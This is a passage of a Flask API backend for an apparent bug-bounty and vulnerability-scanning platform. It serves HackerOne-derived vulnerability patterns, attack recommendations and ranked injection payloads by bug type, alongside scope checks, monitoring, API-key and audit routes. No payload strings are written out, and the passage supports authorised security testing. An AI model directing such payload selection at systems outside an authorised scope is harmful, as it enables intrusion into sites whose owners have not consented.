        return jsonify(db_stats())
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/h1/patterns", methods=["GET"])
def h1_patterns():
    """
    Return aggregated vulnerability patterns.
    ?type=endpoint|param|payload  &bug_type=xss  &limit=50  &min_freq=2
    """
    ptype    = request.args.get("type", "endpoint")
    bug_type = request.args.get("bug_type", "")
    limit    = min(int(request.args.get("limit", 50)), 500)
    # Default min_freq=1: with 100 reports many params appear once; raise to 3+ at 10k scale
    min_freq = int(request.args.get("min_freq", 1))

    try:
        from engine.h1_ingest import get_endpoint_patterns, get_param_patterns, get_payloads
        if ptype == "endpoint":
            data = get_endpoint_patterns(bug_type, min_freq, limit)
        elif ptype == "param":
            data = get_param_patterns(bug_type, min_freq, limit)
        elif ptype == "payload":
            data = [{"value": p, "bug_type": bug_type}
                    for p in get_payloads(bug_type or "xss", limit)]
        else:
            return jsonify({"error": "type must be endpoint|param|payload"}), 400
        return jsonify({"patterns": data, "count": len(data), "type": ptype})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/h1/intel", methods=["GET"])
def h1_intel_for_endpoint():
    """
    Get intelligence for a specific endpoint path.
    GET /h1/intel?path=/api/v1/users&bug_type=idor
    Returns: matched_bugs, top_params, payloads
    """
    path     = request.args.get("path", "")
    bug_type = request.args.get("bug_type", "")
    if not path:
        return jsonify({"error": "path required"}), 400
    try:
        from engine.h1_ingest import get_intel_for_endpoint
        return jsonify(get_intel_for_endpoint(path, bug_type))
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/h1/payloads", methods=["GET"])
def h1_payloads_for_type():
    """
    Return real-world payloads for a bug type.
    GET /h1/payloads?bug_type=xss&limit=30
    """
    bug_type = request.args.get("bug_type", "xss")
    limit    = min(int(request.args.get("limit", 30)), 200)
    try:
        from engine.h1_ingest import get_payloads
        payloads = get_payloads(bug_type, limit)
        return jsonify({"bug_type": bug_type, "payloads": payloads, "count": len(payloads)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500



@app.route("/h1/risk_hotspots", methods=["GET"])
def h1_risk_hotspots():
    """
    Return highest-scoring endpoint+bug_type combinations across all H1 data.
    GET /h1/risk_hotspots?limit=20&min_score=30
    """
    limit     = min(int(request.args.get("limit", 20)), 100)
    min_score = float(request.args.get("min_score", 0))
    try:
        from engine.h1_intel import get_risk_hotspots
        hotspots = get_risk_hotspots(limit)
        if min_score > 0:
            hotspots = [h for h in hotspots if h["score"] >= min_score]
        return jsonify({"hotspots": hotspots, "count": len(hotspots)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/h1/recommendations", methods=["GET"])
def h1_recommendations():
    """
    Structured attack recommendations for a URL path based on H1 patterns.
    GET /h1/recommendations?path=/api/v1/users&bug_type=idor
    Returns: matched_bugs (scored), priority_params, recommended_tests with payloads.
    """
    path     = request.args.get("path", "")
    bug_type = request.args.get("bug_type", "")
    if not path:
        return jsonify({"error": "path required"}), 400
    try:
        from engine.h1_intel import get_recommendations
        return jsonify(get_recommendations(path, bug_type))
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/h1/related_patterns", methods=["GET"])
def h1_related_patterns():
    """
    Correlated patterns for a bug type: endpoints, params, programs, payloads.
    GET /h1/related_patterns?bug_type=ssrf&limit=10
    """
    bug_type = request.args.get("bug_type", "xss")
    limit    = min(int(request.args.get("limit", 10)), 50)
    try:
        from engine.h1_intel import get_related_patterns
        return jsonify(get_related_patterns(bug_type, limit))
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/h1/programs", methods=["GET"])
def h1_programs_by_bug():
    """
    Programs with most reports for a bug type.
    GET /h1/programs?bug_type=xss&limit=20
    """
    bug_type = request.args.get("bug_type", "xss")
    limit    = min(int(request.args.get("limit", 20)), 100)
    try:
        from engine.h1_intel import get_programs_by_bug
        programs = get_programs_by_bug(bug_type, limit)
        return jsonify({"bug_type": bug_type, "programs": programs, "count": len(programs)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/h1/param_intel", methods=["GET"])
def h1_param_intel():
    """
    Full intelligence for a parameter name: bug types, risk score, payloads.
    GET /h1/param_intel?name=redirect
    """
    name = request.args.get("name", "")
    if not name:
        return jsonify({"error": "name required"}), 400
    try:
        from engine.h1_intel import get_param_intel
        return jsonify(get_param_intel(name))
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/h1/scored_patterns", methods=["GET"])
def h1_scored_patterns():
    """
    Patterns with multi-factor confidence scores.
    GET /h1/scored_patterns?type=endpoint|param&bug_type=ssrf&min_score=20&limit=30
    Returns: frequency, severity, recency, breadth, certainty per pattern.
    """
    ptype     = request.args.get("type", "endpoint")
    bug_type  = request.args.get("bug_type", "")
    limit     = min(int(request.args.get("limit", 30)), 200)
    min_score = float(request.args.get("min_score", 0))
    try:
        from engine.h1_intel import get_scored_endpoints, get_scored_params
        if ptype == "endpoint":
            data = get_scored_endpoints(bug_type, limit, min_score)
        elif ptype == "param":
            data = get_scored_params(bug_type, limit, min_score)
        else:
            return jsonify({"error": "type must be endpoint or param"}), 400
        return jsonify({"patterns": data, "count": len(data), "type": ptype})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/h1/rebuild_status", methods=["GET"])
def h1_rebuild_status():
    """Check whether background index rebuild is running."""
    try:
        from engine.h1_intel import rebuild_status
        return jsonify(rebuild_status())
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/h1/rebuild_index", methods=["POST"])
def h1_rebuild_index():
    """Rebuild the pattern index from stored raw data."""
    def _run():
        try:
            from engine.h1_ingest import build_pattern_index
            build_pattern_index()
            log.info("[h1] pattern index rebuilt")
        except Exception as e:
            log.error(f"[h1] rebuild failed: {e}")
    threading.Thread(target=_run, daemon=True, name="h1-rebuild").start()
    return jsonify({"ok": True, "message": "Pattern index rebuild started"})


# ══════════════════════════════════════════════════════════════════════════════
# PAYLOAD INTELLIGENCE ROUTES
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/payloads/families", methods=["GET"])
def payload_families():
    """
    GET /payloads/families?bug_type=xss&surface=api&limit=20
    Returns canonical payload families ranked by score.
    Default: safe + low_risk tiers only.
    """
    bug_type  = request.args.get("bug_type", "")
    surface   = request.args.get("surface", "")
    transport = request.args.get("transport", "")
    limit     = min(int(request.args.get("limit", 20)), 100)
    include_lab = request.args.get("include_lab", "").lower() == "true"
    try:
        from engine.payload_intel import get_families, TIER_LAB_ONLY, DEFAULT_TIERS
        tiers = set(DEFAULT_TIERS)
        if include_lab: tiers.add(TIER_LAB_ONLY)
        families = get_families(bug_type, surface, transport, tiers, limit)
        return jsonify({"families": families, "count": len(families),
                        "tiers_applied": list(tiers)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/payloads/search", methods=["GET"])
def payload_search():
    """
    GET /payloads/search?bug_type=xss&param=q&surface=web&top_n=15
    Ranked payload selection for a specific bug+context.
    Returns literal strings ordered by family_score × confidence.
    """
    bug_type  = request.args.get("bug_type", "xss")
    param     = request.args.get("param", "")
    surface   = request.args.get("surface", "")
    transport = request.args.get("transport", "")
    top_n     = min(int(request.args.get("top_n", 15)), 50)
    include_lab = request.args.get("include_lab", "").lower() == "true"
    try:
        from engine.payload_intel import select_payloads
        payloads = select_payloads(bug_type, param, surface, transport, top_n,
                                   include_lab=include_lab)
        return jsonify({"bug_type": bug_type, "payloads": payloads,
                        "count": len(payloads), "param": param,
                        "lab_included": include_lab})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/payloads/templates", methods=["GET"])
def payload_templates():
    """
    GET /payloads/templates?bug_type=ssrf&limit=10
    Returns canonical templates with placeholders for a bug type.
    """
    bug_type = request.args.get("bug_type", "")
    limit    = min(int(request.args.get("limit", 10)), 50)
    try:
        from engine.payload_intel import get_families, DEFAULT_TIERS
        families = get_families(bug_type, limit=limit, safety_tiers=DEFAULT_TIERS)
        templates = [{"family_id": f["family_id"], "template": f["template"],
                      "bug_type": f["bug_type"], "family_name": f["family_name"],
                      "safety_tier": f["safety_tier"], "score": f["family_score"]}
                     for f in families]
        return jsonify({"templates": templates, "count": len(templates)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/payloads/stats", methods=["GET"])
def payload_stats():
    """GET /payloads/stats — DB statistics for UI panel."""
    try:
        from engine.payload_intel import get_stats
        return jsonify(get_stats())
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/payloads/recommendations", methods=["GET"])
def payload_recommendations():
    """
    GET /payloads/recommendations?bug_type=sqli&param=id&surface=api
    Returns top-N scored payloads with family context for a specific test scenario.
    """
    bug_type = request.args.get("bug_type", "xss")
    param    = request.args.get("param", "")
    surface  = request.args.get("surface", "")
    top_n    = min(int(request.args.get("top_n", 10)), 30)
    try:
        from engine.payload_intel import select_payloads, get_families, DEFAULT_TIERS
        payloads  = select_payloads(bug_type, param, surface, top_n=top_n)
        families  = get_families(bug_type, surface=surface, limit=5,
                                 safety_tiers=DEFAULT_TIERS)
        return jsonify({"bug_type": bug_type, "param": param, "surface": surface,
                        "payloads": payloads, "count": len(payloads),
                        "families": [{"family_id": f["family_id"],
                                      "family_name": f["family_name"],
                                      "score": f["family_score"]} for f in families]})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/payloads/intel", methods=["GET"])
def payload_intel_param():
    """
    GET /payloads/intel?param=url
    Returns which bug types a parameter name is associated with + top payloads per type.
    """
    param = request.args.get("param", "")
    if not param:
        return jsonify({"error": "param required"}), 400
    try:
        from engine.h1_intel import PARAM_BUG_MAP
        from engine.payload_intel import select_payloads
        bug_types = PARAM_BUG_MAP.get(param.lower(), [])
        result = []
        for bt in bug_types[:5]:
            payloads = select_payloads(bt, param_name=param, top_n=5)
            result.append({"bug_type": bt, "payloads": payloads, "count": len(payloads)})
        return jsonify({"param": param, "bug_types": result,
                        "total_mapped": len(bug_types)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/payloads/source_stats", methods=["GET"])
def payload_source_stats():
    """GET /payloads/source_stats — breakdown by source type."""
    try:
        from engine.payload_intel import _db
        with _db() as conn:
            rows = conn.execute(
                "SELECT source_type, COUNT(*) as n, AVG(confidence) as avg_conf "
                "FROM payload_variants GROUP BY source_type ORDER BY n DESC"
            ).fetchall()
            sources = conn.execute("SELECT * FROM payload_sources ORDER BY last_ingested DESC").fetchall()
        return jsonify({
            "by_source_type": [dict(r) for r in rows],
            "sources": [dict(s) for s in sources],
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/payloads/rebuild_index", methods=["POST"])
def payload_rebuild_index():
    """POST /payloads/rebuild_index?include_seclists=true — re-bootstrap canonical payload DB."""
    include_sl = request.args.get("include_seclists","").lower() == "true"
    try:
        from engine.payload_intel import rebuild_background
        started = rebuild_background(include_seclists=include_sl)
        return jsonify({"ok": True,
                        "started": started,
                        "message": "Rebuild started" if started else "Already running",
                        "poll": "/payloads/rebuild_status"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/payloads/rebuild_status", methods=["GET"])
def payload_rebuild_status():
    """GET /payloads/rebuild_status — check background rebuild progress."""
    try:
        from engine.payload_intel import rebuild_status
        return jsonify(rebuild_status())
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/rag/sources", methods=["GET"])
def rag_sources():
    """List all available ingest sources."""
    try:
        from engine.rag_ingest import SOURCES, FAST_SOURCES
        return jsonify({
            "all_sources":  list(SOURCES.keys()),
            "fast_sources": FAST_SOURCES,
            "total":        len(SOURCES),
        })
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/findings/mark_fp", methods=["POST"])
def mark_false_positive():
    """Mark a finding as false positive."""
    p   = request.get_json(silent=True, force=True) or {}
    fid = str(p.get("finding_id") or p.get("id",""))
    d   = _domain(p.get("domain",""))
    try:
        db.mark_finding_status(d, fid, "false_positive")
        return jsonify({"ok":True,"finding_id":fid,"status":"false_positive"})
    except Exception as e:
        return jsonify({"ok":True,"note":str(e)})


@app.route("/findings/mark_confirmed", methods=["POST"])
def mark_confirmed():
    """Mark a finding as confirmed."""
    p   = request.get_json(silent=True, force=True) or {}
    fid = str(p.get("finding_id") or p.get("id",""))
    d   = _domain(p.get("domain",""))
    try:
        db.mark_finding_status(d, fid, "confirmed")
        return jsonify({"ok":True,"finding_id":fid,"status":"confirmed"})
    except Exception as e:
        return jsonify({"ok":True,"note":str(e)})


@app.route("/findings/override", methods=["POST"])
def findings_override():
    """Override severity or mark FP with analyst note."""
    p       = request.get_json(silent=True, force=True) or {}
    d       = _domain(p.get("domain",""))
    fid     = str(p.get("finding_id",""))
    new_sev = p.get("severity","")
    note    = p.get("note","")
    is_fp   = p.get("false_positive",False)
    try:
        patch = {}
        if new_sev: patch["severity"] = new_sev
        if note:    patch["analyst_note"] = note
        if is_fp:
            db.mark_finding_status(d, fid, "false_positive")
        if patch:
            try: db.update_finding(d, p.get("url",""), p.get("bug",""), patch)
            except Exception: pass
        return jsonify({"ok":True,"finding_id":fid,"changes":patch})
    except Exception as e:
        return jsonify({"ok":True,"note":str(e)})


@app.route("/brain/stats", methods=["GET"])
def brain_stats():
    """Persistent payload brain statistics."""
    try:
        from engine.agentic_loop import get_brain_stats
        s = get_brain_stats() or {}
        return jsonify({"ok":True,"stats":s,
                       "total_findings": s.get("total_findings",0),
                       "payloads_used":  s.get("payloads_used",0),
                       "bugs_seen":      s.get("bugs_seen",0),
                       "learning_rate":  s.get("learning_rate","active")})
    except Exception as e:
        return jsonify({"ok":False,"stats":{},"total_findings":0,"payloads_used":0,"error":str(e)})


@app.route("/brain/payloads", methods=["GET"])
def brain_payloads():
    """Get learned payloads for a bug type."""
    bug   = request.args.get("bug","xss")
    param = request.args.get("param","")
    try:
        from engine.agentic_loop import load_successful_payloads
        payloads = load_successful_payloads(bug, param, limit=20)
        return jsonify({"payloads":payloads,"bug":bug,"count":len(payloads)})
    except Exception as e:
        return jsonify({"payloads":[],"error":str(e)})

@app.route("/retest/single", methods=["POST"])
def retest_single():
    payload = request.get_json(silent=True, force=True) or {}
    d       = _domain(payload.get("domain",""))
    finding = payload.get("finding",{})
    try:
        from engine.retest import RetestEngine
        engine = RetestEngine()
        result = engine.retest(finding)
        # Notify
        get_rich_notifier().retest_result(result, d)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ── Rich Notifications ────────────────────────────────────────────────────────

# ═══════════════════════════════════════════════════════════════════════════════
# ENTERPRISE — Organizations, Teams, Programs, API Keys, Usage
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/orgs", methods=["GET"])
def orgs_list():
    """List all organizations (admin only)."""
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    sess = _vt(tok)
    if not sess: return jsonify({"error":"Unauthorized"}), 401
    audit("list_orgs", CATEGORY_ORG)
    return jsonify({"orgs": list_orgs()})


@app.route("/orgs", methods=["POST"])
def orgs_create():
    """Create a new organization."""
    from engine.rbac import verify_token as _vt, get_session
    tok  = (request.headers.get("Authorization","").replace("Bearer","").strip()
            or request.args.get("token",""))
    sess = _vt(tok)
    if not sess: return jsonify({"error":"Unauthorized"}), 401
    p      = request.get_json(silent=True) or {}
    name   = (p.get("name","") or "").strip()
    plan   = p.get("plan","starter")
    if not name: return jsonify({"error":"name required"}), 400
    user_sess = get_session(tok) or {}
    org = create_org(name=name, plan=plan,
                     owner_user_id=user_sess.get("user_id",""),
                     owner_username=user_sess.get("username",""),
                     owner_email=user_sess.get("email",""))
    record_usage(org["id"], user_sess.get("user_id",""), "org_created")
    audit("create_org", CATEGORY_ORG, resource_id=org["id"], resource_name=name)
    return jsonify({"ok": True, "org": org}), 201


@app.route("/orgs/<org_id>", methods=["GET"])
def orgs_get(org_id):
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    org = get_org(org_id)
    if not org: return jsonify({"error":"not found"}), 404
    usage = get_usage_summary(org_id)
    return jsonify({"org": org, "usage": usage})


@app.route("/orgs/<org_id>/members", methods=["GET"])
def orgs_members(org_id):
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    return jsonify({"members": list_members(org_id), "teams": list_teams(org_id)})


@app.route("/orgs/<org_id>/members", methods=["POST"])
def orgs_add_member(org_id):
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    p = request.get_json(silent=True) or {}
    member = add_member(org_id,
                        user_id=p.get("user_id",""),
                        username=p.get("username",""),
                        email=p.get("email",""),
                        role=p.get("role","analyst"),
                        team_id=p.get("team_id",""))
    audit("add_member", CATEGORY_ORG, resource_id=org_id,
          resource_name=p.get("username",""))
    return jsonify({"ok": True, "member": member}), 201


@app.route("/orgs/<org_id>/teams", methods=["POST"])
def orgs_create_team(org_id):
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    p    = request.get_json(silent=True) or {}
    name = p.get("name","").strip()
    if not name: return jsonify({"error":"name required"}), 400
    team = create_team(org_id, name=name, description=p.get("description",""))
    audit("create_team", CATEGORY_ORG, resource_id=team["id"], resource_name=name)
    return jsonify({"ok": True, "team": team}), 201


# ── Programs ──────────────────────────────────────────────────────────────────

@app.route("/enterprise/programs", methods=["GET"])
def ent_programs_list():
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    org_id = request.args.get("org_id","")
    status = request.args.get("status","")
    return jsonify({"programs": list_programs(org_id, status)})


@app.route("/enterprise/programs", methods=["POST"])
def ent_programs_create():
    from engine.rbac import verify_token as _vt, get_session
    tok  = (request.headers.get("Authorization","").replace("Bearer","").strip()
            or request.args.get("token",""))
    sess = _vt(tok)
    if not sess: return jsonify({"error":"Unauthorized"}), 401
    p    = request.get_json(silent=True) or {}
    name = p.get("name","").strip()
    org_id = p.get("org_id","")
    if not name: return jsonify({"error":"name required"}), 400
    # Check scan quota
    if org_id:
        ok, reason = can_start_scan(org_id)
        # Programs don't consume scan quota — just note
    user_sess = get_session(tok) or {}
    prog = create_program(
        org_id=org_id, name=name,
        platform=p.get("platform","private"),
        prog_type=p.get("type","bbp"),
        created_by=user_sess.get("username",""),
        scope_domains=p.get("scope_domains",[]),
        scope_wildcards=p.get("scope_wildcards",[]),
        out_of_scope=p.get("out_of_scope",[]),
        reward_range=p.get("reward_range",{}),
        policy_url=p.get("policy_url",""),
    )
    audit("create_program", CATEGORY_PROGRAM, resource_id=prog["id"], resource_name=name)
    return jsonify({"ok": True, "program": prog}), 201


@app.route("/enterprise/programs/<program_id>", methods=["GET"])
def ent_programs_get(program_id):
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    prog = get_program(program_id)
    if not prog: return jsonify({"error":"not found"}), 404
    prog["assets"] = list_program_assets(program_id)
    return jsonify({"program": prog})


@app.route("/enterprise/programs/<program_id>", methods=["PATCH"])
def ent_programs_update(program_id):
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    updates = request.get_json(silent=True) or {}
    prog = update_program(program_id, updates)
    audit("update_program", CATEGORY_PROGRAM, resource_id=program_id)
    return jsonify({"ok": True, "program": prog})


@app.route("/enterprise/programs/<program_id>/scope_check")
def ent_programs_scope_check(program_id):
    """GET /programs/<id>/scope_check?domain=example.com"""
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    domain = _domain(request.args.get("domain",""))
    if not domain: return jsonify({"error":"domain required"}), 400
    in_scope, reason = is_in_scope(program_id, domain)
    return jsonify({"domain": domain, "in_scope": in_scope, "reason": reason})


@app.route("/enterprise/programs/<program_id>/assets", methods=["POST"])
def ent_programs_add_asset(program_id):
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    p = request.get_json(silent=True) or {}
    asset = add_program_asset(program_id, p.get("asset",""), p.get("type","domain"))
    audit("add_asset", CATEGORY_PROGRAM, resource_id=program_id,
          resource_name=p.get("asset",""))
    return jsonify({"ok": True, "asset": asset}), 201


# ── API Keys ──────────────────────────────────────────────────────────────────

@app.route("/enterprise/keys", methods=["GET"])
def ent_apikeys_list():
    from engine.rbac import verify_token as _vt, get_session
    tok  = (request.headers.get("Authorization","").replace("Bearer","").strip()
            or request.args.get("token",""))
    sess = get_session(tok)
    if not sess: return jsonify({"error":"Unauthorized"}), 401
    return jsonify({"keys": list_api_keys(sess.get("user_id",""))})


@app.route("/enterprise/keys", methods=["POST"])
def ent_apikeys_create():
    from engine.rbac import verify_token as _vt, get_session
    tok  = (request.headers.get("Authorization","").replace("Bearer","").strip()
            or request.args.get("token",""))
    sess = get_session(tok)
    if not sess: return jsonify({"error":"Unauthorized"}), 401
    p        = request.get_json(silent=True) or {}
    raw_key, record = create_api_key(
        user_id=sess.get("user_id",""),
        org_id=p.get("org_id",""),
        name=p.get("name","Default"),
        permissions=p.get("permissions",["scan","read"]),
        rate_limit=p.get("rate_limit",100),
        expires_days=p.get("expires_days"),
    )
    audit("create_api_key", CATEGORY_API_KEY, resource_name=p.get("name",""))
    return jsonify({
        "ok":       True,
        "key":      raw_key,   # shown ONCE — not stored
        "record":   record,
        "warning":  "Save this key now — it will never be shown again.",
    }), 201


@app.route("/enterprise/keys/<key_id>", methods=["DELETE"])
def ent_apikeys_revoke(key_id):
    from engine.rbac import verify_token as _vt, get_session
    tok  = (request.headers.get("Authorization","").replace("Bearer","").strip()
            or request.args.get("token",""))
    sess = get_session(tok)
    if not sess: return jsonify({"error":"Unauthorized"}), 401
    revoke_api_key(key_id, sess.get("user_id",""))
    audit("revoke_api_key", CATEGORY_API_KEY, resource_id=key_id)
    return jsonify({"ok": True})


@app.route("/orgs/<org_id>/usage")
def orgs_usage(org_id):
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    period = request.args.get("period","")
    return jsonify(get_usage_summary(org_id, period))


# ═══════════════════════════════════════════════════════════════════════════════
# CONTINUOUS MONITORING
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/monitoring/jobs", methods=["GET"])
def mon_jobs_list():
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    org_id = request.args.get("org_id","")
    domain = request.args.get("domain","")
    jobs   = mon_list_jobs(org_id=org_id, domain=domain)
    return jsonify({"jobs": jobs, "count": len(jobs)})


@app.route("/monitoring/jobs", methods=["POST"])
def mon_jobs_create():
    """
    POST /monitoring/jobs
    {"domain":"example.com","org_id":"...","interval_h":24,"name":"Watch example.com"}

    Creates a continuous monitoring job. The scheduler will automatically run it
    every interval_h hours and alert on changes via Discord/Telegram.
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    p      = request.get_json(silent=True) or {}
    domain = _domain(p.get("domain",""))
    if not domain: return jsonify({"error":"valid domain required"}), 400
    job = mon_create_job(
        domain=domain,
        org_id=p.get("org_id",""),
        program_id=p.get("program_id",""),
        name=p.get("name",""),
        interval_h=int(p.get("interval_h", 24)),
        alert_on=p.get("alert_on"),
        notify_channels=p.get("notify_channels"),
        options=p.get("options"),
    )
    audit("create_monitor_job", CATEGORY_SCAN, resource_name=domain,
          resource_id=job["id"])
    return jsonify({"ok": True, "job": job}), 201


@app.route("/monitoring/jobs/<job_id>", methods=["GET"])
def mon_jobs_get(job_id):
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    job = mon_get_job(job_id)
    if not job: return jsonify({"error":"not found"}), 404
    # Include latest snapshot summary
    snap = get_latest_snapshot(job["domain"], job_id)
    job["latest_snapshot"] = {
        k: snap.get(k) for k in ("taken_at","sub_count","live_count",
                                   "endpoint_count","finding_count","finding_highs")
    } if snap else None
    return jsonify({"job": job})


@app.route("/monitoring/jobs/<job_id>", methods=["PATCH"])
def mon_jobs_update(job_id):
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    updates = request.get_json(silent=True) or {}
    job = mon_update_job(job_id, updates)
    return jsonify({"ok": True, "job": job})


@app.route("/monitoring/jobs/<job_id>", methods=["DELETE"])
def mon_jobs_delete(job_id):
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    mon_delete_job(job_id)
    audit("delete_monitor_job", CATEGORY_SCAN, resource_id=job_id)
    return jsonify({"ok": True})


@app.route("/monitoring/jobs/<job_id>/run", methods=["POST"])
def mon_jobs_run_now(job_id):
    """Manually trigger a monitoring job immediately."""
    from engine.rbac import verify_token as _vt
    from engine.monitoring import run_job
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    job = mon_get_job(job_id)
    if not job: return jsonify({"error":"not found"}), 404
    import threading as _mt
    result_holder = {}
    def _run():
        result_holder["result"] = run_job(job, db)
    t = _mt.Thread(target=_run, daemon=True); t.start(); t.join(timeout=30)
    result = result_holder.get("result", {"ok": False, "error": "timeout"})
    audit("run_monitor_job", CATEGORY_SCAN, resource_id=job_id,
          resource_name=job["domain"])
    return jsonify(result)


@app.route("/monitoring/deltas")
def mon_deltas():
    """GET /monitoring/deltas?domain=X&unnotified=1"""
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    domain     = _domain(request.args.get("domain",""))
    job_id     = request.args.get("job_id","")
    unnotified = request.args.get("unnotified","0") == "1"
    limit      = min(int(request.args.get("limit","100")), 500)
    deltas = get_deltas(domain=domain, job_id=job_id,
                        unnotified_only=unnotified, limit=limit)
    return jsonify({"deltas": deltas, "count": len(deltas)})


@app.route("/monitoring/snapshot", methods=["POST"])
def mon_snapshot_take():
    """Manually take a snapshot for a domain."""
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    p      = request.get_json(silent=True) or {}
    domain = _domain(p.get("domain",""))
    job_id = p.get("job_id","manual")
    if not domain: return jsonify({"error":"domain required"}), 400
    snap   = take_snapshot(job_id, domain, db)
    return jsonify({"ok": True, "snapshot": {
        k: snap.get(k) for k in ("id","domain","taken_at","sub_count",
                                   "live_count","endpoint_count","finding_count")
    }})


# ═══════════════════════════════════════════════════════════════════════════════
# AUDIT LOG
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/audit/v2/events")
def audit_v2_events():
    """
    GET /audit/events?org_id=X&action=X&category=X&days=30&limit=100

    Returns compliance audit log. Immutable append-only events.
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    days    = min(int(request.args.get("days","30")), 365)
    limit   = min(int(request.args.get("limit","100")), 1000)
    offset  = int(request.args.get("offset","0"))
    since   = time.time() - (days * 86400)
    events  = query_events(
        org_id=request.args.get("org_id",""),
        user_id=request.args.get("user_id",""),
        action=request.args.get("action",""),
        category=request.args.get("category",""),
        result=request.args.get("result",""),
        since_ts=since, limit=limit, offset=offset,
    )
    return jsonify({"events": events, "count": len(events),
                    "note": "Append-only compliance log. No events can be deleted."})


@app.route("/audit/v2/stats")
def audit_v2_stats():
    """GET /audit/stats?days=30&org_id=X"""
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    days   = min(int(request.args.get("days","30")), 365)
    org_id = request.args.get("org_id","")
    return jsonify(audit_get_stats(days=days, org_id=org_id))


@app.route("/audit/v2/export")
def audit_v2_export():
    """GET /audit/export?format=json&days=30 — export audit log for compliance."""
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401
    days   = min(int(request.args.get("days","30")), 365)
    org_id = request.args.get("org_id","")
    since  = time.time() - (days * 86400)
